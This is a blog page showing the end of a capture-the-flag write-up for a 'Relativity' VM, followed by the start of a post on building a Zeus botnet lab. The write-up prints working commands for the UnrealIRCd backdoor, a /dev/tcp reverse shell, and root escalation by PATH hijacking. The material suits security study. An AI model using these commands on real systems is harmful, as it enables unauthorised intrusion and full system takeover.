<p>The bash_history confirmed the use of the ircd, and as such, I re-setup my ssh connection to the server, this time forwarding port 6667 to my laptop so that I may connect to it with a local irc client. The ssh command now looked something like this: <code>ssh -L 6667:127.0.0.1:6667 mauk@192.168.56.21 -i key</code></p>

<h3>good &lsquo;ol irc</h3>

<p>With the now forwarded IRC port, my local client connected to the irc service, and the following MOTD was sent:</p>

<figure class='code'><figcaption><span>Relativity IRC</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Connecting…
</span><span class='line'>Connected
</span><span class='line'>*** Looking up your hostname...
</span><span class='line'>*** Couldn<span class="err">&#39;</span>t resolve your hostname<span class="p">;</span> using your IP address instead
</span><span class='line'>Logged in
</span><span class='line'>Welcome to the Relativity IRC Network bobsmith!bobsmith@localhost
</span><span class='line'>Your host is relativity.localdomain, running version Unreal3.2.8.1
</span><span class='line'>This server was created Thu Feb 28 2013 at 17:54:35 EST
</span><span class='line'>relativity.localdomain Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
</span><span class='line'>UHNAMES NAMESX SAFELIST HCN <span class="nv">MAXCHANNELS</span><span class="o">=</span>10 <span class="nv">CHANLIMIT</span><span class="o">=</span><span class="c">#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 are supported by this server</span>
</span><span class='line'>WALLCHOPS <span class="nv">WATCH</span><span class="o">=</span>128 <span class="nv">WATCHOPTS</span><span class="o">=</span>A <span class="nv">SILENCE</span><span class="o">=</span>15 <span class="nv">MODES</span><span class="o">=</span>12 <span class="nv">CHANTYPES</span><span class="o">=</span><span class="c"># PREFIX=(qaohv)~&amp;@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=Relativity CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&amp;@%+ are supported by this server</span>
</span><span class='line'>EXCEPTS INVEX <span class="nv">CMDS</span><span class="o">=</span>KNOCK,MAP,DCCALLOW,USERIP are supported by this server
</span><span class='line'>There are 1 users and 0 invisible on 1 servers
</span><span class='line'>I have 1 clients and 0 servers
</span><span class='line'>Current Local Users: 1  Max: 1
</span><span class='line'>Current Global Users: 1  Max: 1
</span><span class='line'>- relativity.localdomain Message of the Day -
</span><span class='line'>- 9/7/2013 9:17
</span><span class='line'>-     __________       .__          __  .__      .__  __
</span><span class='line'>-     <span class="se">\_</span>_____   <span class="se">\ </span>____ <span class="p">|</span>  <span class="p">|</span> _____ _/  <span class="p">|</span>_<span class="p">|</span>__<span class="p">|</span>__  _<span class="p">|</span>__<span class="p">|</span>/  <span class="p">|</span>_ ___.__.
</span><span class='line'>-      <span class="p">|</span>       _// __ <span class="se">\|</span>  <span class="p">|</span> <span class="se">\_</span>_  <span class="se">\\</span>   __<span class="se">\ </span> <span class="se">\ </span> <span class="se">\/</span> /  <span class="se">\ </span>  __&lt;   <span class="p">|</span>  <span class="p">|</span>
</span><span class='line'>-      <span class="p">|</span>    <span class="p">|</span>   <span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span>__/ __ <span class="se">\|</span>  <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span><span class="se">\ </span>  /<span class="p">|</span>  <span class="o">||</span>  <span class="p">|</span>  <span class="se">\_</span>__  <span class="p">|</span>
</span><span class='line'>-      <span class="p">|</span>____<span class="p">|</span>_  /<span class="se">\_</span>__  &gt;____<span class="o">(</span>____  /__<span class="p">|</span> <span class="p">|</span>__<span class="p">|</span> <span class="se">\_</span>/ <span class="p">|</span>__<span class="o">||</span>__<span class="p">|</span>  / ____<span class="p">|</span> ·VM·
</span><span class='line'>-             <span class="se">\/</span>     <span class="se">\/</span>          <span class="se">\/</span>                        <span class="se">\/</span>
</span><span class='line'>End of /MOTD command.
</span></code></pre></td></tr></table></div></figure>


<p>Toying around with the IRC service did not yeald much results. No useful channels or anything funny was found with the service. However, the actual server that was running was <a href="http://www.unrealircd.com/">UnrealIRCD</a> v 3.8.2.1 as can be seen in the servers MOTD. Again, using this amazing tool called Google, I checked whats up with this version of UnrealIRCD. Lo and behold the first hit &lsquo;UnrealIRCD 3.2.8.1 Backdoor Command Execution &ndash; Rapid7&rsquo;. Excellent. Seems like this version has a remote command execution backdoor. The hit on Google to Rapid7&rsquo;s actually links to a Metasploit module for this exact same backdoor.</p>

<p>It was time to research the vulnerability a bit, just to understand what exactly is going on here. A great resource was found <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">here</a>, where it was explained that a piece of code exists <code>#define DEBUG3_DOLOG_SYSTEM(x) system(x)</code>, that does a system command if it sees traffic prepended with <code>AB;</code>. Alright. I didn’t have metasploit immediately available, so I opted for the <code>nc</code> shell, just to test it out. To my disappointment, it seemed like I missed something very important here as I received no output when issuing commands.</p>

<p>So back to the drawing board it was. I decided to download and compile my own local version of the backdoored ircd daemon, and test what the expected result of this backdoor should be. At the same time I also learnt a little about unrealircd itself and how to configure it. win :)</p>

<p>Eventually I got the daemon running and was able to test the backdoor locally. Still, no command output was received when commands were issued, however, I did notice that the commands themselves actually <strong>do</strong> execute. I echoed &lsquo;a&rsquo; to a file in /tmp/ via the backdoor, and in a SSH session confirmed that it now existed.</p>

<p>So, back on the challenge vm, I have port 6667 still forwarded locally. To test this, I ran a command to list the contents of /home/ and redirect the output to a file in /tmp.</p>

<figure class='code'><figcaption><span>Testing UnrealIRCD backdoor</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># echo &quot;AB; ls -lah /home/ &gt; /tmp/1&quot; | nc 127.0.0.1 6667</span>
</span><span class='line'>:relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
</span><span class='line'>:relativity.localdomain NOTICE AUTH :*** Couldn<span class="err">&#39;</span>t resolve your hostname<span class="p">;</span> using your IP address instead
</span><span class='line'>:relativity.localdomain 451 AB<span class="p">;</span> :You have not registered
</span><span class='line'>^C
</span></code></pre></td></tr></table></div></figure>


<p>Back on the SSH session I had with <code>mauk</code>&rsquo;s account, /tmp/1 appeared, however without permissions for me to see it. So, I reran the previous command, substituting the backdoor command to <code>chmod 777 /tmp/1</code>. I reran the cat on /tmp/1 in mauk&rsquo;s session and bam:</p>

<figure class='code'><figcaption><span>UnrealIRCD backdoor testing</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mauk@Relativity ~<span class="o">]</span><span class="nv">$ </span>cat /tmp/1
</span><span class='line'>total 16K
</span><span class='line'>drwxr-xr-x.  4 root  root  4.0K Feb 25  2013 .
</span><span class='line'>dr-xr-xr-x. 18 root  root  4.0K Feb 28  2013 ..
</span><span class='line'>drwx------.  4 jetta jetta 4.0K Sep 28 10:03 jetta
</span><span class='line'>drwxr-xr-x.  3 mauk  mauk  4.0K Jul  9 08:55 mauk
</span></code></pre></td></tr></table></div></figure>


<p>Oh yes! Its working! In a broken kind of way, but it works! To make my life a little easier, I changed the backdoor command to actually give me a back connect bash shell so that I can have a interactive session. Its a time saving thing really. My command to the IRCd was now <code>echo "AB; bash -i &gt;&amp; /dev/tcp/&lt;my machine&gt;/6676 0&gt;&amp;1" | nc 127.0.0.1 6667</code>. On my machine I opened a netcat listener on port 6676 and waited for the session to spawn:</p>

<figure class='code'><figcaption><span>Back connect shell for jetta</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># nc -vnlp 6676</span>
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 6676 ...
</span><span class='line'>connect to <span class="o">[</span>&lt;snip&gt;<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.21<span class="o">]</span> 53493
</span><span class='line'>bash: no job control in this shell
</span><span class='line'><span class="o">[</span>jetta@Relativity Unreal<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Great. Now it will be a lot easier to navigate around. Spawing the shell the way I did started me off in <code>/opt/Unreal</code>, which was a directory I previously did not have access to. I poked around here for a bit, trying to see if I missed anything with regards to the IRC setup. Nothing was immediately apparent, so, I moved on to the rest of the machine. More specifically, in <code>jetta</code>&rsquo;s home directory, there was a binary called <code>auth_server</code>, owned by root, but with no suid bit. I attempted to execute the binary, and was greeted by a spinning pipe, and eventually a &lsquo;error(12)&rsquo; after a classic cowsay.</p>

<figure class='code'><figcaption><span>auth_server Test run</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="nv">$ </span>ls -lah auth_server/auth_server
</span><span class='line'>ls -lah auth_server/auth_server
</span><span class='line'>-rwxr-xr-x 1 root root 7.9K Mar  8  2013 auth_server/auth_server
</span><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="nv">$ </span>auth_server/auth_server
</span><span class='line'>auth_server/auth_server
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Checking Certificates...done
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Contacting server, please wait...- ____________________________
</span><span class='line'>/ Windows 2000 is out!       <span class="se">\</span>
</span><span class='line'><span class="p">|</span>                            <span class="p">|</span>
</span><span class='line'><span class="se">\ </span>-- PC Magazine, April 2013 /
</span><span class='line'> ----------------------------
</span><span class='line'>        <span class="se">\ </span>  ^__^
</span><span class='line'>         <span class="se">\ </span> <span class="o">(</span>oo<span class="o">)</span><span class="se">\_</span>______
</span><span class='line'>            <span class="o">(</span>__<span class="o">)</span><span class="se">\ </span>      <span class="o">)</span><span class="se">\/\</span>
</span><span class='line'>                <span class="o">||</span>----w <span class="p">|</span>
</span><span class='line'>                <span class="o">||</span>     <span class="o">||</span>
</span><span class='line'>could not establish connection
</span><span class='line'>error: <span class="o">(</span>12<span class="o">)</span>
</span><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Right&hellip; well that is not exactly very helpful&hellip; or is it? Admittedly, this was the part that cost me the most time. I got lost on a path which is lead by enum->sploit->post, and wandered off into a world of binary analysis, process packet sniffing and eventually reverse engineering. Initially, I somehow figured that <code>auth_server</code> should be running, and <em>should</em> provide the IRCd with NickServ capabilities, so that <em>maybe</em> I could VHOST to a vDomain of a operator account, IDENT as him and then discover other hidden treasures&hellip;</p>

<p>Granted, I did do some basic enum, and figured after I ran <code>id</code> and saw that the account for <code>jetta</code> was not in any fancy groups, there was nothing more to see here.</p>

<p><strong>EVENTUALLY</strong>, after a number of tactical coffees and rethinking of what I have seen so far, I came back to re-attempt this.</p>

<h3>the shortest straw</h3>

<p>I reran <code>auth_server</code> a few more times, and decided to push the binary through strings one more time, just to see if <em>maybe</em> the clue will be more clear now:</p>

<figure class='code'><figcaption><span>auth_server Strings-ed</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># strings auth_server</span>
</span><span class='line'>/lib64/ld-linux-x86-64.so.2
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>fflush
</span><span class='line'>puts
</span><span class='line'>putchar
</span><span class='line'><span class="nb">printf</span>
</span><span class='line'>poll
</span><span class='line'>stdout
</span><span class='line'>system
</span><span class='line'>__libc_start_main
</span><span class='line'>GLIBC_2.2.5
</span><span class='line'>l<span class="nv">$ </span>L
</span><span class='line'>t<span class="k">$(</span>L
</span><span class='line'><span class="p">|</span><span class="nv">$0H</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Checking Certificates...
</span><span class='line'><span class="k">done</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Contacting server, please wait...
</span><span class='line'>could not establish connection
</span><span class='line'>invalid certificates
</span><span class='line'>error: <span class="o">(</span>12<span class="k">)</span>
</span><span class='line'>fortune -s <span class="p">|</span> /usr/bin/cowsay
</span><span class='line'>Starting Auth server..
</span><span class='line'><span class="p">;</span>*3<span class="nv">$&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This did not help me get what I was clearly missing, and so, I went back to the enumeration step. What do I know about my current environment? WHERE do I have access now? WHAT access do I have? Anything different here that I may be missing. Eventually, I tried to so a <code>sudo -l</code>, which should list the commands I am allowed to run with sudo. Because my shells were all build with netcat, I had no proper tty to work with, so, sudo would complain about this. A quick fix with python, and all is well again:</p>

<figure class='code'><figcaption><span>jetta&#8217;s sudo -l</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>sudo: sorry, you must have a tty to run sudo
</span><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="nv">$ </span>python -c <span class="s2">&quot;import pty;pty.spawn(&#39;/bin/sh&#39;);&quot;</span>
</span><span class='line'>python -c <span class="s2">&quot;import pty;pty.spawn(&#39;/bin/sh&#39;);&quot;</span>
</span><span class='line'>sh-4.2<span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for </span>jetta on this host:
</span><span class='line'>    requiretty, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR</span>
</span><span class='line'><span class="s2">    LS_COLORS&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS</span>
</span><span class='line'><span class="s2">    LC_CTYPE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT</span>
</span><span class='line'><span class="s2">    LC_MESSAGES&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER</span>
</span><span class='line'><span class="s2">    LC_TELEPHONE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET</span>
</span><span class='line'><span class="s2">    XAUTHORITY PATH&quot;</span>, env_reset
</span><span class='line'>
</span><span class='line'>User jetta may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /home/jetta/auth_server/auth_serveyr
</span><span class='line'>sh-4.2<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>And there it is! <code>auth_server</code> may be run as root with no password requirement! \o/. Immediately I jumped to running <code>sudo /home/jetta/auth_server/auth_server</code>, just to be met with the same fate of &lsquo;error(12)&rsquo;. While playing with the binary earlier, I was however convinced that this error(12) thing was exactly what it was configured to do and nothing more. Yes, thats it. Simply write the &lsquo;Checking Certs&rsquo;, &lsquo;Contacting Server&rsquo; part, then, run <code>fortune -s | /usr/bin/cowsay</code> and error(12).</p>

<p>&hellip; wait a sec. <code>fortune</code> is not called from its full relative path, however /usr/bin/cowsay is. This means if I can fool the binary into thinking something else is this <code>fortune</code> command, then I may be able to root the box. Especially if I can make it think my bash shell is <code>fortune</code> :)</p>

<h3>finishing off</h3>

<p>With all the knowledge I have gained now, I moved on to finishing off by rooting the box. This was achieved by firstly creating a script called <code>fortune</code>, which was simply the old bash command pushed over /dev/tcp again, and placing it in <em>/home/jetta/bin</em>. I then ensured that <code>fortune</code> was executable and tested it by just running it alone. It was working fine :)</p>

<p>Next, I have to fool the auth_server binary to think that my new fortune script is in fact the one it was looking for. To do this, I added a path to the PATH env variable, and rehashed the bins. Lastly, I ran <code>auth_server</code> as root, and switched to my last nc listener on port 6677&hellip;</p>

<figure class='code'><figcaption><span>auth_server Exploitation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="sb">```</span>@Relativity ~<span class="o">]</span><span class="nv">$ </span>python -c <span class="s2">&quot;import pty;pty.spawn(&#39;/bin/sh&#39;);&quot;</span>
</span><span class='line'>sh-4.2<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/home/jetta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
</span><span class='line'>&lt;etta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
</span><span class='line'>sh-4.2<span class="nv">$ </span><span class="nb">hash</span> -r
</span><span class='line'>sh-4.2<span class="nv">$ </span>sudo auth_server/auth_server
</span><span class='line'>sudo auth_server/auth_server
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Checking Certificates...done
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Contacting server, please wait...could not establish connection
</span><span class='line'>error: <span class="o">(</span>12<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>auth_server</code> did its usual trick with error(12), however, my netcat listener now had a root prompt \o/</p>

<figure class='code'><figcaption><span>root shell and flag.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># nc -lvp 6677</span>
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 6677 ...
</span><span class='line'>192.168.56.21: inverse host lookup failed: Unknown server error : Connection timed out
</span><span class='line'>connect to <span class="o">[</span>&lt;snip&gt;<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.21<span class="o">]</span> 38267
</span><span class='line'><span class="o">[</span>root@Relativity jetta<span class="o">]</span><span class="c"># id</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'><span class="o">[</span>root@Relativity jetta<span class="o">]</span><span class="c"># locate flag.txt</span>
</span><span class='line'>locate flag.txt
</span><span class='line'>/root/flag.txt
</span><span class='line'><span class="o">[</span>root@Relativity jetta<span class="o">]</span><span class="c"># cat /root/flag.txt</span>
</span><span class='line'>cat /root/flag.txt
</span><span class='line'>65afa0e5928b98f7ae283e16df2d43bf
</span><span class='line'><span class="o">[</span>root@Relativity jetta<span class="o">]</span><span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see, flag.txt was found by simply using the locate command for the file. Because I am now root, I have no troubles reading it, and as such, the challenge was considered completed!</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/">Zeus - My Adventure with a Infamous Bot</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-09-23T14:21:00+02:00" pubdate data-updated="true">Sep 23<sup>rd</sup>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h6>var disclaimer = require(&lsquo;standard_disclaimer.js&rsquo;);</h6>

<p><strong>NOTE! THIS IS FOR EDUCATIONAL PURPOSES ONLY. CHANCES ARE, IF YOU TRY THIS WITHOUT PERMISSION, YOU WILL GET CAUGHT AND GET THROWN INTO A DARK PLACE WITH NO INTERNET AND A ANGRY NATIVE WITH A BIG STICK &ndash; ALONE</strong></p>

<h3>Bots for the masses.</h3>

<p>Recently at a conference that I attended, I sat in a class that was talking about Botnets and general &lsquo;How Easy They Are&rsquo; related things. 90% of the technical discussions did not really come as a surprise to me, however, I came to realize that I am not <strong>100%</strong> aware of how ( and I dare say this lightly ) <em>easy</em> they have it. The technical competency of the adversary really doesn&rsquo;t have to be at a jaw droppingly high level. In fact, if you can operate the keyboard and mouse, heck, even a tablet/phone once its all setup, then you could potentially be a successful botnet operator.</p>

<h3>So, botnet?</h3>

<p>In its simplest form, a bot, from an attackers perspective, is simply a part of a larger resource network. A number, that if not available, does not really matter as there are many more that form part of the larger botnet. A very well known botnet is the <a href="http://en.wikipedia.org/wiki/Zeus_(Trojan_horse)">Zeus botnet</a>. Popular for its ability to perform credential theft, it was sold from what appears to range from $700 to $15000, depending on the extra <em>features</em> that you&rsquo;d like. Some of these features include the ability to connect via VNC to a remote host in order to graphically control it.</p>

<p>So for $700, you can buy a relatively easy to setup piece of software that would allow you to <em>steal</em> credentials from random victims. This activity is only one part of a larger cybertheft cycle. The wikipedia article <a href="http://en.wikipedia.org/wiki/Zeus_(Trojan_horse)">here</a> does a excellent job to describe the process in a image:</p>

<p><img src="http://upload.wikimedia.org/wikipedia/en/2/2d/FBI_Fraud_Scheme_Zeus_Trojan.jpg"></p>

<h3>The Zeus Bot Architecture</h3>

<p>The Zeus bot client side software is a windows only piece of malware. Typically infection would occur via a <a href="http://en.wikipedia.org/wiki/Drive-by_download">drive-by download</a> (which is the scariest and possibly most stealthy form of infection), or via other means such as facebook posts, phishing sites etc, enticing the user to run an arbitrary executable. Of course, infection is not limited to these methods. Simply getting access to a computer, plugging in your thumbdrive and running the bot software is a completely valid form of infection.</p>

<p>Once infection is successful, the client runs silently on the victim PC, masking itself as much as possible. The client would have a time configured that tells it how often it should update the Command and Control server with new collected information, as well as dynamic configuration updates, new commands it should run and keep-alive check-ins.</p>

<h3>Zeus Source Leaked</h3>

<p>The full Zeus bot sources <a href="https://www.csis.dk/en/csis/blog/3229/">leaked</a> around March 2011, and a Github repo of it was made <a href="https://github.com/Visgean/Zeus">here</a>. This allowed any one in the public to dissect, inspect and test the Malware. This was probably not a good thing for the malware authors&#8217; business :). However, now, anyone is able to grab the sources, modify it as required and use. It leads to the possibility of even more sophistication in a already successful botnet, such as adding peer-to-peer communications with C&amp;C servers instead of relying on HTTP as can be seen in <a href="http://www.cert.pl/PDF/2013-06-p2p-rap_en.pdf">this</a> excellent analysis by <a href="https://twitter.com/CERT_Polska_en">@CERT_Polska_en</a>.</p>

<h3>LAB Time!</h3>

<p>Now that we have the full sources, I decided it&rsquo;s time to setup a LAB to configure and play with this bot.</p>

<p>I have a KVM Server at my disposal, and figured it will be a good idea to use that. The basic idea of the lab was to have a simulated internet network, a firewall, and a client network that makes use of this &ldquo;Fake Internet&rdquo;. I created 2 isolated networks, configured a set of CentOS 6, and Windows XP clients and a Server 2008 R2 Server.</p>

<p>In short, the lab was going to look something like this:</p>

<figure class='code'><figcaption><span>Internal Zeus LAB</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>                         Virtual Machine Management Interface
</span><span class='line'>                         +-----------------------------------&gt;
</span><span class='line'>                                   <span class="p">|</span>
</span><span class='line'>                                   <span class="p">|</span>
</span><span class='line'>                                   <span class="p">|</span>
</span><span class='line'>                              +----+---------+
</span><span class='line'>                              <span class="p">|</span>              <span class="p">|</span>
</span><span class='line'>                  +-----------+  Firewall    +-----------+
</span><span class='line'>                  <span class="p">|</span>           <span class="p">|</span>              <span class="p">|</span>           <span class="p">|</span>
</span><span class='line'>                  <span class="p">|</span>           +--------------+           <span class="p">|</span>
</span><span class='line'>                  <span class="p">|</span>                                      <span class="p">|</span>                 +----------+
</span><span class='line'>                  <span class="p">|</span>                  ^                   <span class="p">|</span>              +--<span class="p">|</span> Victim A <span class="p">|</span>
</span><span class='line'>          +---------------+          <span class="p">|</span>           +----------------+     <span class="p">|</span>  +----------+
</span><span class='line'>          <span class="p">|</span>               <span class="p">|</span>          <span class="p">|</span>           <span class="p">|</span>                <span class="p">|</span>     <span class="p">|</span>
</span><span class='line'>          <span class="p">|</span> Fake Internet <span class="p">|</span>          +           <span class="p">|</span>   Fake LAN     +-----+  +----------+
</span><span class='line'>          <span class="p">|</span>               <span class="p">|</span>                      <span class="p">|</span>                <span class="p">|</span>     +--+ Victim B <span class="p">|</span>
</span><span class='line'>          +------+--------+   NAT Towards Fake   +----------------+        +----------+
</span><span class='line'>                 <span class="p">|</span>            Internet Interface
</span><span class='line'>                 <span class="p">|</span>
</span><span class='line'>        +--------+--------+--------------------+----------------+
</span><span class='line'>        <span class="p">|</span>                 <span class="p">|</span>                    <span class="p">|</span>                <span class="p">|</span>
</span><span class='line'>        <span class="p">|</span>                 <span class="p">|</span>                    <span class="p">|</span>                <span class="p">|</span>
</span><span class='line'>        <span class="p">|</span>                 <span class="p">|</span>                    <span class="p">|</span>                +
</span><span class='line'> +------+-----+     +-----+------+      +------+-------+     +-----------------+
</span><span class='line'> <span class="p">|</span>            <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>              <span class="p">|</span>     <span class="p">|</span>                 <span class="p">|</span>
</span><span class='line'> <span class="p">|</span> Zeus Bot   <span class="p">|</span>     <span class="p">|</span> Zeus Web   <span class="p">|</span>      <span class="p">|</span> Random Victim<span class="p">|</span>     <span class="p">|</span> Compromised     <span class="p">|</span>
